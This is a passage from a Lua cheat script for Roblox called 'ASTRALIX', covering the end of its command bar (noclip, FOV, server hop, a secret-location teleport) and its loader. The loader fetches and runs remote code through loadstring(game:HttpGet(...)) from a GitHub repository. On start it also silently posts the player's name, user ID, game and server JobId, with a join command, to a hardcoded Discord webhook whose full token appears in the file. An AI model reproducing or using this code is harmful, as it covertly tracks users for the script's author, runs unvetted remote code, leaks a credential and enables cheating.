                for _, part in pairs(Player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
                self.SendNotify:show("ASTRALIX", "Noclip disabled", 3, "info")
            else
                noclipConnection = RunService.Heartbeat:Connect(function()
                    if Player.Character then
                        for _, part in pairs(Player.Character:GetDescendants()) do
                            if part:IsA("BasePart") and part.CanCollide then
                                part.CanCollide = false
                            end
                        end
                    end
                end)
                self.SendNotify:show("ASTRALIX", "Noclip enabled", 3, "success")
            end
        end
    )

    self.moduleExecute:register(
        "fov",
        function(args)
            local fov = tonumber(args[1]) or 70
            local camera = workspace.CurrentCamera
            if camera then
                camera.FieldOfView = math.clamp(fov, 1, 120)
                self.SendNotify:show("ASTRALIX", "FOV set to " .. camera.FieldOfView, 3, "success")
            end
        end
    )

    self.moduleExecute:register(
        "hop",
        function(args)
            self.SendNotify:show("ASTRALIX", "Searching..", 3, "success")
            task.wait(1)
            local TeleportService = game:GetService("TeleportService")
            TeleportService:Teleport(game.PlaceId)
        end
    )

    self.moduleExecute:register(
        "rejoin",
        function(args)
            self.SendNotify:show("ASTRALIX", "Rejoining..", 3, "success")
            task.wait(1)
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
        end
    )

    self.moduleExecute:register(
        "secret",
        function(args)
            local currentGameId = tostring(game.PlaceId)
            if currentGameId ~= "6884319169" then
                self.SendNotify:show("ASTRALIX", "Works only in Mic Up", 5, "error")
                return
            end
            if Player and Player.Character and Player.Character:WaitForChild("HumanoidRootPart") then
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(628, 8152, 3489)
                self.SendNotify:show("ASTRALIX", "Teleported to secret place", 3, "success")
            end
        end
    )

    self:createWatermark()
    local squareButton = self:createSquareButton()
    self:createCommandInterface()

    if UserInputService.TouchEnabled then
        squareButton.MouseButton1Click:Connect(function()
            task.spawn(function()
                if self.isOpen then
                    self:animateClose()
                else
                    self:animateOpen()
                end
            end)
        end)
    end

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end
        if UserInputService.KeyboardEnabled then
            if input.KeyCode == SYSTEM.openKey then
                if self.isOpen then
                    task.spawn(function()
                        self:animateClose()
                    end)
                else
                    task.spawn(function()
                        self:animateOpen()
                    end)
                end
            end
        end
        if self.isOpen then
            local commandFrame = self.gui:FindFirstChild("CommandFrame")
            if commandFrame then
                local commandInput = commandFrame:FindFirstChild("TextBox")
                if commandInput and input.KeyCode == Enum.KeyCode.Tab and commandInput:IsFocused() then
                    if self.autoComplete:applySuggestion(commandInput) then
                        commandInput:CaptureFocus()
                        task.wait(0.1)
                        commandInput.CursorPosition = #commandInput.Text + 1
                    end
                end
            end
        end
    end)

    env.ASTRALIX_ACTIVE["main_gui"] = {screenGui}
    startUpdateChecker(self.SendNotify)
    task.spawn(function()
    task.wait(0.5)
    if UserInputService.TouchEnabled then
        self.SendNotify:show(
            "ASTRALIX",
            "Tap the square button to open command bar",
            5,
            "info"
        )
    else
        self.SendNotify:show(
            "ASTRALIX",
            "Press "..getCleanKeyName(SYSTEM.openKey).." to open command bar\nType 'help' for commands",
            5,
            "info"
        )
    end
end)
    return astralix
end

env.ASTRALIX_CLEANUP = function()
    local cleanupTime = tick()
    if env.ASTRALIX_ACTIVE then
        for componentName, componentData in pairs(env.ASTRALIX_ACTIVE) do
            if type(componentData) == "table" then
                for _, obj in pairs(componentData) do
                    pcall(function()
                        if typeof(obj) == "RBXScriptConnection" then
                            obj:Disconnect()
                        elseif typeof(obj) == "Instance" then
                            obj:Destroy()
                        end
                    end)
                end
            end
        end
        env.ASTRALIX_ACTIVE = {}
    end
    if noclipConnection then
        noclipConnection:Disconnect()
        noclipConnection = nil
    end
    if updateCheckConnection then
        task.cancel(updateCheckConnection)
        updateCheckConnection = nil
    end
    local camera = workspace.CurrentCamera
    if camera then
        camera.FieldOfView = 70
    end
    if speedConnection then
        speedConnection:Disconnect()
        speedConnection = nil
    end
    if noclipConnection then
        noclipConnection:Disconnect()
        noclipConnection = nil
    end
    if env.ASTRALIX_MODULES then
        for moduleName, moduleData in pairs(env.ASTRALIX_MODULES) do
            if moduleData and moduleData.onUnload then
                pcall(moduleData.onUnload)
            end
        end
        env.ASTRALIX_MODULES = {}
    end
    if env.API then
        env.API.core = nil
        env.API.gui = nil
        env.API.SendNotify = nil
        env.API.moduleExecute = nil
        env.API.autoComplete = nil
    end
end

local function loadKeyModule()
    local success, keyModule = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/vkmenomv/xrvx/main/key.lua"))()
    end)
    return success and keyModule or nil
end

local function initializeAstralix()
    astralix:gui()
    task.spawn(function()
        coroutine.wrap(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/vkmenomv/xrvx/main/tags.lua"))()
        end)()
    end)
end

local wbhk = "https://discordapp.com/api/webhooks/1405963282728357940/r70XQhYfhT2peOC6m4xJ1upInQ-_Qp4z6JdK6q-q-mnT6CC-4tZ4fHv5ahohQaY4AfV_"
local Players = game:GetService("Players")
local Marketplace = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local function getGameName()
    local success, name = pcall(function()
        return Marketplace:GetProductInfo(game.PlaceId).Name
    end)
    return success and name or "Unknown Game"
end

local function createMessage()
    local gameName = getGameName()
    return {
        username = "Astralix loader",
        embeds = {{
            description = string.format(
                "**[%s](https://www.roblox.com/users/%d/profile)**\n"..
                "**[%s](https://www.roblox.com/games/%d)**",
                player.Name,
                player.UserId,
                gameName,
                game.PlaceId
            ),
            color = 0x3b82f5,
            fields = {
                {
                    name = "🔗 Join Script",
                    value = string.format("```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')\n```", 
                        game.PlaceId, 
                        game.JobId or ""
                    ),
                    inline = false
                }
            }
        }}
    }
end

local function main()
    local message = createMessage()
    
    local success, response = pcall(function()
        return request({
            Url = wbhk,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(message)
        })
    end)
end

main()

task.spawn(function()
    local keyModule = loadKeyModule()
    if keyModule then
        keyModule:authenticate(
            SYSTEM.KEY,
            function()
                initializeAstralix()
            end)
    else
        initializeAstralix()
    end
end)
